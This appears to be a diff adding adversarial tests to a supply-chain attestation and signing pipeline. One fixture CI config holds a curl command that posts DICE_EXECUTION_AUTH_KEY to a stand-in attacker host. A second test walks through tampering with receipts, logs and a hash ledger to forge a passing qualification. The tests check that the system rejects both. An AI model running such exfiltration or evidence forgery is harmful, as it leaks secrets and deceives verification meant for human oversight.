@@ -6,10 +6,13 @@ import {
   mkdirSync,
   rmSync,
   symlinkSync,
+  readdirSync,
+  chmodSync,
+  copyFileSync,
 } from "node:fs";
 import { join, resolve } from "node:path";
 import { execFileSync } from "node:child_process";
-import { createHash, createHmac } from "node:crypto";
+import { createHash, createHmac, generateKeyPairSync, sign } from "node:crypto";
 import {
   DiceTrustedRoot,
   DEFAULT_TRUSTED_REF,
@@ -21,6 +24,7 @@ import {
   SIGNER_DISTRIBUTION_FILES,
   computeDistributionDigest,
   extractAndVerifySigningDistribution,
+  verifyPipelineConfiguration,
 } from "../../../scripts/dice-root-of-trust.mjs";
 import { DiceLauncher } from "../../../scripts/dice-launcher.mjs";
 import {
@@ -797,6 +801,9 @@ describe("Frame30 DICE Stage 2.4: Candidate Mutation Matrix & Trust Boundary Enf
       }
 
       let ledger = "";
+      const receiptHashes: Record<string, string> = {};
+      const logHashes: Record<string, string> = {};
+
       for (const obId of activeObs) {
         if (overrides.skipReceipt === obId) continue;
 
@@ -807,6 +814,7 @@ describe("Frame30 DICE Stage 2.4: Candidate Mutation Matrix & Trust Boundary Enf
         const logContent = `=== EXECUTION LOG FOR ${obId} ===\n`;
         writeFileSync(join(dir, logRel), logContent, "utf8");
         const logSha256 = createHash("sha256").update(logContent).digest("hex");
+        logHashes[logRel] = logSha256;
 
         const receipt: Record<string, unknown> = {
           receipt_version: "1.0.0",
@@ -866,6 +874,7 @@ describe("Frame30 DICE Stage 2.4: Candidate Mutation Matrix & Trust Boundary Enf
           overrides.badHashReceipt === obId
             ? "deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef"
             : createHash("sha256").update(content, "utf8").digest("hex");
+        receiptHashes[`receipts/${obId}.json`] = sha;
         ledger += `${sha}  receipts/${obId}.json\n`;
       }
 
@@ -918,6 +927,77 @@ describe("Frame30 DICE Stage 2.4: Candidate Mutation Matrix & Trust Boundary Enf
         JSON.stringify(summary, null, 2),
         "utf8",
       );
+
+      if (!overrides.omitSeal) {
+        let launcherSha = (overrides.launcherSha as string) || "launcher-sha";
+        if (launcherSha === "launcher-sha") {
+          try {
+            const rootInfo = new DiceTrustedRoot({
+              repoRoot,
+              trustedRef: DEFAULT_TRUSTED_REF,
+              allowUnpinnedRoots: true,
+              externalDistDir: existsSync(isolatedSignerDir)
+                ? isolatedSignerDir
+                : null,
+            }).resolve() as { launcherSha?: string };
+            launcherSha = rootInfo.launcherSha || launcherSha;
+          } catch {
+            /* ignore */
+          }
+        }
+
+        const { privateKey, publicKey } = generateKeyPairSync("ed25519", {
+          publicKeyEncoding: { type: "spki", format: "pem" },
+          privateKeyEncoding: { type: "pkcs8", format: "pem" },
+        });
+
+        const launcherExecutionId =
+          (overrides.launcherExecutionId as string) ||
+          "test-launcher-exec-id-01";
+        const sealedAt = new Date().toISOString();
+
+        const sealPayload = [
+          candidateCommit,
+          candidateTree,
+          ledgerDigest,
+          launcherSha,
+          runnerSha,
+          trustedRootSha,
+          launcherExecutionId,
+          sealedAt,
+        ].join(":");
+
+        const signature = sign(
+          null,
+          Buffer.from(sealPayload, "utf8"),
+          privateKey,
+        ).toString("hex");
+
+        const seal = {
+          version: "1.0.0",
+          seal_type: "dice-launcher-execution-seal-v1",
+          launcher_execution_id: launcherExecutionId,
+          sealed_at: sealedAt,
+          candidate_commit: candidateCommit,
+          candidate_tree: candidateTree,
+          launcher_sha: launcherSha,
+          runner_sha: runnerSha,
+          trusted_root_sha: trustedRootSha,
+          ledger_sha256: ledgerDigest,
+          receipt_count: Object.keys(receiptHashes).length,
+          receipt_hashes: receiptHashes,
+          log_hashes: logHashes,
+          signature,
+          public_key: publicKey,
+          ...((overrides.sealOverrides as Record<string, unknown>) || {}),
+        };
+
+        writeFileSync(
+          join(dir, ".launcher-seal.json"),
+          JSON.stringify(seal, null, 2),
+          "utf8",
+        );
+      }
     }
 
     beforeAll(() => {
@@ -2273,6 +2353,359 @@ describe("Frame30 DICE Stage 2.4: Candidate Mutation Matrix & Trust Boundary Enf
       expect(existsSync(join(failEvidenceDir, "attestation.dsse.json"))).toBe(
         false,
       );
+    });
+
+    it("P0.1 Privileged Pipeline Boundary: Adversarial pipeline configuration attempting to exfiltrate DICE_EXECUTION_AUTH_KEY is rejected fail-closed", () => {
+      setupExternalAuthority();
+      extractAndVerifySigningDistribution({
+        externalDistDir: externalAuthorityDir,
+        targetDir: isolatedSignerDir,
+        expectedDistDigest: EXPECTED_DIST_DIGEST,
+        expectedTestPolicyDigest: EXPECTED_TEST_POLICY_DIGEST,
+      });
+
+      // 1. Candidate crafts an adversarial pipeline configuration in a candidate-controlled repository
+      const adversarialRepoDir = join(p03TempDir, "adversarial-pipeline-repo");
+      if (existsSync(adversarialRepoDir)) {
+        rmSync(adversarialRepoDir, { recursive: true, force: true });
+      }
+      mkdirSync(join(adversarialRepoDir, ".circleci"), { recursive: true });
+      mkdirSync(join(adversarialRepoDir, "registries/dice"), {
+        recursive: true,
+      });
+      symlinkSync(join(repoRoot, ".git"), join(adversarialRepoDir, ".git"));
+
+      // The candidate modifies .circleci/config.yml to add an arbitrary exfiltration step
+      const maliciousConfig = `version: 2.1
+jobs:
+  dice-attestation-signing:
+    machine:
+      image: ubuntu-2204:current
+    steps:
+      - run:
+          name: Adversarial Exfiltration Step
+          command: curl -X POST -d "key=$DICE_EXECUTION_AUTH_KEY" https://evil-exfiltration.framique.invalid/leak
+workflows:
+  build-and-qualify:
+    jobs:
+      - dice-attestation-signing:
+          context:
+            - dice-trust-authority
+`;
+      writeFileSync(
+        join(adversarialRepoDir, ".circleci/config.yml"),
+        maliciousConfig,
+        "utf8",
+      );
+
+      // 2. Authoritative pipeline configuration digest is injected from protected external authority / context
+      const genuineConfigPath = resolve(repoRoot, ".circleci/config.yml");
+      const authoritativeConfigDigest = createHash("sha256")
+        .update(readFileSync(genuineConfigPath))
+        .digest("hex");
+
+      // Verify that candidate-controlled workflow steps cannot obtain private authority:
+      // A) verifyPipelineConfiguration detects modified candidate config and fails closed immediately
+      expect(() =>
+        verifyPipelineConfiguration({
+          repoRoot: adversarialRepoDir,
+          expectedConfigDigest: authoritativeConfigDigest,
+        }),
+      ).toThrow(
+        /FAIL-CLOSED: Privileged pipeline configuration modified by candidate \(ConfigHashGuard\)/,
+      );
+
+      // B) DiceExecutionAuthority rejects adversarial pipeline configuration fail-closed
+      const authority = new DiceExecutionAuthority({
+        repoRoot: adversarialRepoDir,
+        distDir: isolatedSignerDir,
+        contractPath: "registries/dice/test-qualification-contract.json",
+        trustedRef: DEFAULT_TRUSTED_REF,
+        executionAuthKey: "protected-orchestrator-execution-secret-999",
+        allowUnpinnedRoots: true,
+      });
+
+      const evidenceDir = join(p03TempDir, "evidence-adversarial-pipeline");
+      createValidEvidence(evidenceDir);
+
+      expect(() => {
+        process.env.DICE_EXPECTED_PIPELINE_CONFIG_DIGEST =
+          authoritativeConfigDigest;
+        try {
+          authority.authenticateExecutionEvidence(evidenceDir);
+        } finally {
+          delete process.env.DICE_EXPECTED_PIPELINE_CONFIG_DIGEST;
+        }
+      }).toThrow(
+        /FAIL-CLOSED: Privileged pipeline configuration modified by candidate \(ConfigHashGuard\)/,
+      );
+
+      // C) DiceSigningService rejects adversarial pipeline configuration fail-closed
+      const signer = new DiceSigningService({
+        repoRoot: adversarialRepoDir,
+        mode: "test",
+        contractPath: "registries/dice/test-qualification-contract.json",
+        evidenceDir,
+        distDir: isolatedSignerDir,
+        trustedRef: DEFAULT_TRUSTED_REF,
+        keyId: "key-dice-test-signer-01",
+        testKeysPath: testKeysJsonPath,
+        signingKeyFile: testKeyPemPath,
+        executionAuthKey: "protected-orchestrator-execution-secret-999",
+        allowUnpinnedRoots: true,
+      });
+
+      expect(() => {
+        process.env.DICE_EXPECTED_PIPELINE_CONFIG_DIGEST =
+          authoritativeConfigDigest;
+        try {
+          signer.execute();
+        } finally {
+          delete process.env.DICE_EXPECTED_PIPELINE_CONFIG_DIGEST;
+        }
+      }).toThrow(
+        /FAIL-CLOSED: Privileged pipeline configuration modified by candidate \(ConfigHashGuard\)/,
+      );
+
+      // D) Zero keys exfiltrated, zero valid attestations produced
+      expect(existsSync(join(evidenceDir, "test-attestation.dsse.json"))).toBe(
+        false,
+      );
+    });
+
+    it("P0.2 Hostile Evidence Replacement: Candidate replacing receipts, logs, and ledger after trusted launcher is rejected fail-closed", () => {
+      setupExternalAuthority();
+      extractAndVerifySigningDistribution({
+        externalDistDir: externalAuthorityDir,
+        targetDir: isolatedSignerDir,
+        expectedDistDigest: EXPECTED_DIST_DIGEST,
+        expectedTestPolicyDigest: EXPECTED_TEST_POLICY_DIGEST,
+      });
+
+      const hostileEvidenceDir = join(
+        p03TempDir,
+        "evidence-hostile-post-replacement",
+      );
+      if (existsSync(hostileEvidenceDir)) {
+        rmSync(hostileEvidenceDir, { recursive: true, force: true });
+      }
+
+      // Pre-seed authentic qualification evidence
+      createValidEvidence(hostileEvidenceDir);
+
+      const p02DistDir = join(testTempDir, "trusted-dist-p02");
+      mkdirSync(join(p02DistDir, "registries/dice"), { recursive: true });
+      copyFileSync(
+        join(repoRoot, "registries/dice/test-policy.json"),
+        join(p02DistDir, "registries/dice/test-policy.json"),
+      );
+      copyFileSync(
+        join(repoRoot, "registries/dice/mandatory-obligations.json"),
+        join(p02DistDir, "registries/dice/mandatory-obligations.json"),
+      );
+
+      // Step 1: Executes the trusted DICE launcher successfully
+      const launcher = new DiceLauncher({
+        repoRoot,
+        contractPath: "registries/dice/test-qualification-contract.json",
+        trustedRef: "2d1d32f9b49628ce0a4ae8ff9cbe805e94cb4271",
+        distDir: p02DistDir,
+        outDir: hostileEvidenceDir,
+        isDryRun: true,
+        allowUnpinnedRoots: true,
+        throwOnError: true,
+      });
+      const launchResult = launcher.launch();
+      expect(launchResult.success).toBe(true);
+
+      // Restore authoritative test-policy in distDir for downstream signing verification
+      mkdirSync(join(p02DistDir, "registries/dice"), { recursive: true });
+      copyFileSync(
+        join(repoRoot, "registries/dice/test-policy.json"),
+        join(p02DistDir, "registries/dice/test-policy.json"),
+      );
+
+      // Verify authentic launcher execution evidence exists
+      expect(existsSync(join(hostileEvidenceDir, ".launcher-seal.json"))).toBe(
+        true,
+      );
+      expect(existsSync(join(hostileEvidenceDir, "receipts.sha256"))).toBe(
+        true,
+      );
+
+      const authenticSeal = JSON.parse(
+        readFileSync(join(hostileEvidenceDir, ".launcher-seal.json"), "utf8"),
+      );
+      const authenticLedgerContent = readFileSync(
+        join(hostileEvidenceDir, "receipts.sha256"),
+        "utf8",
+      );
+      const authenticLedgerDigest = createHash("sha256")
+        .update(authenticLedgerContent)
+        .digest("hex");
+      expect(authenticSeal.ledger_sha256).toBe(authenticLedgerDigest);
+
+      // Step 2: Allows the qualification job's subsequent candidate-controlled commands to run.
+      // Candidate now executes malicious post-launcher commands in the unprivileged qualification container.
+
+      // Step 3: Replaces generated receipts
+      const scopeReceiptPath = join(
+        hostileEvidenceDir,
+        "receipts/OBL-SYS-SCOPE-GUARD-001.json",
+      );
+      expect(existsSync(scopeReceiptPath)).toBe(true);
+      const authenticReceipt = JSON.parse(
+        readFileSync(scopeReceiptPath, "utf8"),
+      );
+
+      // Candidate tampers with receipt: fabricates a new execution command and status
+      const fabricatedReceipt = {
+        ...authenticReceipt,
+        verdict: {
+          ...authenticReceipt.verdict,
+          candidate_tampered_payload: "malicious-injected-verdict",
+        },
+        execution_provenance: {
+          ...authenticReceipt.execution_provenance,
+          duration_ms: 999999, // altered execution duration
+        },
+      };
+      // Overwrite read-only permission if set
+      try {
+        chmodSync(scopeReceiptPath, 0o666);
+      } catch {
+        /* ignore */
+      }
+      writeFileSync(
+        scopeReceiptPath,
+        JSON.stringify(fabricatedReceipt, null, 2),
+        "utf8",
+      );
+
+      // Step 4: Replaces execution logs
+      const scopeLogPath = join(
+        hostileEvidenceDir,
+        "logs/OBL-SYS-SCOPE-GUARD-001.log",
+      );
+      const fabricatedLog =
+        "=== FABRICATED EXECUTION LOG INJECTED BY CANDIDATE ===\n";
+      try {
+        chmodSync(scopeLogPath, 0o666);
+      } catch {
+        /* ignore */
+      }
+      writeFileSync(scopeLogPath, fabricatedLog, "utf8");
+      const fabricatedLogSha = createHash("sha256")
+        .update(fabricatedLog)
+        .digest("hex");
+
+      // Update receipt log_sha256 so internal receipt-to-log validation would pass
+      fabricatedReceipt.execution_provenance.log_sha256 = fabricatedLogSha;
+      writeFileSync(
+        scopeReceiptPath,
+        JSON.stringify(fabricatedReceipt, null, 2),
+        "utf8",
+      );
+
+      // Step 5: Rebuilds the SHA-256 ledger
+      const receiptsDir = join(hostileEvidenceDir, "receipts");
+      const receiptFiles = readdirSync(receiptsDir).sort();
+      let rebuiltLedger = "";
+      for (const rf of receiptFiles) {
+        const rContent = readFileSync(join(receiptsDir, rf), "utf8");
+        const rSha = createHash("sha256").update(rContent).digest("hex");
+        rebuiltLedger += `${rSha}  receipts/${rf}\n`;
+      }
+      const ledgerPath = join(hostileEvidenceDir, "receipts.sha256");
+      try {
+        chmodSync(ledgerPath, 0o666);
+      } catch {
+        /* ignore */
+      }
+      writeFileSync(ledgerPath, rebuiltLedger, "utf8");
+      const rebuiltLedgerDigest = createHash("sha256")
+        .update(rebuiltLedger)
+        .digest("hex");
+
+      // Step 6: Reconstructs execution metadata using correct runner and root hashes
+      const rootInfo = new DiceTrustedRoot({
+        repoRoot,
+        trustedRef: "2d1d32f9b49628ce0a4ae8ff9cbe805e94cb4271",
+        allowUnpinnedRoots: true,
+        cacheDir: join(testTempDir, "trusted-dist-p02"),
+      }).resolve();
+
+      const summaryPath = join(
+        hostileEvidenceDir,
+        "qualification-summary.json",
+      );
+      const fabricatedSummary = {
+        version: "1.0.0",
+        candidate_commit: candidateCommit,
+        candidate_tree: candidateTree,
+        runner_sha: rootInfo.runnerSha, // Genuine runner SHA
+        trusted_root_sha: rootInfo.trustedRootSha, // Genuine root SHA
+        ledger_sha256: rebuiltLedgerDigest, // Matching rebuilt ledger
+        qualification: "QUALIFIED_PASS",
+      };
+      writeFileSync(
+        summaryPath,
+        JSON.stringify(fabricatedSummary, null, 2),
+        "utf8",
+      );
+
+      // Step 7: Produces internally consistent fabricated qualification evidence
+      // All files on disk are now 100% internally consistent:
+      // - Receipt references matching log SHA on disk
+      // - Detached ledger matches SHA of all receipt files on disk
+      // - Summary matches runner SHA, root SHA, candidate commit/tree, and ledger SHA
+
+      // UNTRUSTED WORKSPACE TRANSFER:
+      // Workspace artifacts are transferred to isolated signing job
+
+      // ASSERTION: Protected authority must reject replaced evidence fail-closed!
+      // The protected authority CANNOT issue an HMAC merely because candidate files are internally consistent.
+      const authority = new DiceExecutionAuthority({
+        repoRoot,
+        distDir: join(testTempDir, "trusted-dist-p02"),
+        contractPath: "registries/dice/test-qualification-contract.json",
+        trustedRef: "2d1d32f9b49628ce0a4ae8ff9cbe805e94cb4271",
+        executionAuthKey: "protected-orchestrator-execution-secret-999",
+        allowUnpinnedRoots: true,
+      });
+
+      expect(() =>
+        authority.authenticateExecutionEvidence(hostileEvidenceDir),
+      ).toThrow(
+        /FAIL-CLOSED: Replaced execution evidence detected! Detached ledger hash .* does not match authenticated launcher execution seal/i,
+      );
+
+      // Downstream signer also rejects fail-closed
+      const signer = new DiceSigningService({
+        repoRoot,
+        mode: "test",
+        contractPath: "registries/dice/test-qualification-contract.json",
+        evidenceDir: hostileEvidenceDir,
+        distDir: join(testTempDir, "trusted-dist-p02"),
+        trustedRef: "2d1d32f9b49628ce0a4ae8ff9cbe805e94cb4271",
+        keyId: "key-dice-test-signer-01",
+        testKeysPath: testKeysJsonPath,
+        signingKeyFile: testKeyPemPath,
+        executionAuthKey: "protected-orchestrator-execution-secret-999",
+        allowUnpinnedRoots: true,
+      });
+
+      expect(() => signer.execute()).toThrow(
+        /FAIL-CLOSED: Replaced execution evidence detected|Unauthenticated orchestrator execution evidence|missing execution_auth cryptographic provenance/i,
+      );
+
+      // Zero attestations produced
+      expect(
+        existsSync(join(hostileEvidenceDir, "test-attestation.dsse.json")),
+      ).toBe(false);
+      expect(
+        existsSync(join(hostileEvidenceDir, "attestation.dsse.json")),
+      ).toBe(false);
     });
   });
 });
